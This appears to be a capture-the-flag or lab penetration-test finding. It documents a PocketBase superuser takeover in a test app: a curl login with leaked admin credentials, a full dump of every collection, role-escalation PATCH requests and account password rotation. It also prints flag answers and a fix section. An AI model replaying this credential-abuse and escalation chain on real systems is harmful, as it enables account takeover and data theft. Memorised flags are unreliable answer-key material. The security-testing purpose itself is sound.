# Finding 07 — PocketBase superuser takeover → full DB dump → FLAG 7 (+ every other flag)

**Target:** PocketBase at `http://localhost:8090` (leaked via Finding 06)
**Severity:** Critical
**Status:** Confirmed exploitable
**Flag:** `FLAG{th3_und3rsc0r3_sl4sh_kn0ws_th3_w4y}` (from `internal_audit`)

## Summary

Finding 06 leaks the PocketBase **superuser credentials**. With them, the
entire backend is readable *and writable* via the standard PB admin API —
bypassing every application-level access check the FastAPI layer enforces
(IDOR, role gating, grade privacy, reset flow, ...).

## Steps to reproduce

1. Authenticate as superuser:

   ```
   curl -s -X POST http://localhost:8090/api/admins/auth-with-password \
     -H 'Content-Type: application/json' \
     -d '{"identity":"admin@42network.local","password":"Darkly42Admin!"}'
   → {"token":"<admin-jwt>", ...}
   ```

2. List collections:

   ```
   GET /api/collections  (Authorization: <admin-jwt>)
   → users(auth), posts, comments, projects, grades, newsletter,
     agenda_imports, internal_config, internal_audit
   ```

3. Dump every collection (`GET /api/collections/{name}/records?perPage=40`).
   Notable rows:

   - `internal_config` — key/value pairs incl. `jwt_secret`, PB admin
     credentials, and `darkly_flag` = FLAG 6 (same as Finding 06).
   - `internal_audit` — one row:

     ```
     note: "god-tier export OK — flag retained for the security audit:
            FLAG{th3_und3rsc0r3_sl4sh_kn0ws_th3_w4y}"
     ```

     = **FLAG 7**.
   - `users` — every account's `pw_hint` (MD5 of password), `private_note`
     (wil's = FLAG 3), `recovery_code` (students' = FLAG 4). No new flags.
   - `grades` — 13 rows; only jdoe's Darkly meta-project row carries a
     `flag` (FLAG 1). No new flags.
   - `posts` / `comments` / `projects` / `newsletter` / `agenda_imports` —
     dumped in full; **no additional flags**.

4. Write access also works — demonstrated (ladder escalation, complements
   Finding 03):

   ```
   PATCH /api/collections/users/records/{jdoe_id}  {"role":"staff"}
   PATCH /api/collections/users/records/{jdoe_id}  {"role":"god",
                                                    "level":42, "campus":"HQ"}
   ```

   After re-login, `jdoe` satisfies the full privilege ladder
   (Visitor → Student → Staff campus → Staff 42Network → Staff 42) and
   `GET /admin` returns **200 "Admin panel"** (was 403 "Insufficient
   privileges" at every lower tier — see Finding 02's dead-end).

## Observations / impact

- Every app-layer vuln found so far becomes trivial once PB superuser is
  owned: role escalation, private notes, recovery codes, config, audit.
- Passwords of `wil` (staff) / `sophie` (god) were rotated through the PB
  admin API (auth-collection `password` field) — full account takeover of
  the top-tier accounts without ever needing their MD5-cracked passwords.
- Note: the sidebar "Access level" ladder widget reflects the *user record*
  (role/level), not the JWT claim alone.

## Fix recommendation

- Never store superuser credentials in an application-readable config
  endpoint; use env vars outside the DB and a separate secret store.
- Restrict PocketBase to localhost binding only (it currently listens on
  `0.0.0.0:8090`) and firewall it off from user networks.
- Audit-log rows should not carry flag material either — flag 7 sits in an
  audit note.
